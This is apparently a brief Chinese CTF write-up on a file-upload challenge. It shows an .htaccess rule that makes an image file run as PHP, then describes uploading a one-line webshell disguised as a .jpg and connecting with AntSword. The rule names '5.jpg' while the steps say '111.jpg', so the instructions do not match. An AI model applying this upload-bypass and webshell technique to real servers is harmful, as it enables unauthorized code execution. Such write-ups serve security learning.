#文件上传 

`Server : Apache/2.4.7 (Ubuntu)`
title: 试试和某些文件配合呢
```
htaccess文件是什么

htaccess文件是Apache服务器中的一个配置文件，他负责相关目录下的网页配置。通过htaccess文件，可以帮助我们实现：网页301重定向，自定义404错误页面，改变文件扩展名，允许或组织特定的用户或者，目录的访问，禁止目录列表，配置默认文档等功能。
```

有 `.htaccess`  文件
```
<FilesMatch "5.jpg"> SetHandler application/x-httpd-php </FilesMatch>
```
上传 htacces文件 （将文件名中带有 '111.jpg' 的文件当作php文件解析）
上传一句话木马：111.jpg
之后蚁剑连接

111.jpg：
```php
<?php
	phpinfo();
?>
```
也可以